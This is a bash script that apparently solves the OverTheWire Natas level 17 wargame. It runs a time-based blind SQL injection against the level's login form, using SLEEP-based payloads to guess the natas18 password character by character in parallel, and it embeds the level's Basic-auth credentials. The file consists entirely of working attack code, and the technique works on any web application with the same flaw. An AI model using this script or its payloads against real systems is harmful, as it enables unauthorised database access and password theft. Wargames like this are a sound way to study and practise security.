#!/bin/bash

SECONDS=0

$null > alphabet
$null > current_byte

export PASSWORD=""

function perform_request(){
    curl -s 'http://natas17.natas.labs.overthewire.org/index.php?' \
      -H 'Cache-Control: max-age=0' \
      -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' \
      --data-raw "username=natas18\" AND IF(password LIKE BINARY \"$1%\",SLEEP(10),0)#" \
      --compressed \
      --insecure \
      -w %{http_code} \
      -o /dev/null \
      --max-time 7
}

function brute_force_byte(){
    perform_request $1$2 | grep -v "200" > /dev/null && echo "$2" >> "$3"
}

function enum_alphabet_parallel(){
    for letter in {A..Z} {a..z} {0..9}; do echo -e "%25\n$letter\nalphabet"; done | parallel --max-args=3 brute_force_byte
}

function brute_force_byte_parallel(){
    for letter in `cat alphabet`; do echo -e "$PASSWORD\n$letter\ncurrent_byte"; done | parallel --max-args=3 brute_force_byte 
}

function brute_force(){
    for i in {1..32}; do 
	    PASSWORD+=$(cat current_byte); $null > current_byte
	    brute_force_byte_parallel
	    echo -ne $(cat current_byte)
    done
}

function main(){
    enum_alphabet_parallel
    brute_force
}

export -f {perform_request,brute_force_byte,brute_force_byte_parallel,brute_force}

main

echo -e "\n$SECONDS secs"

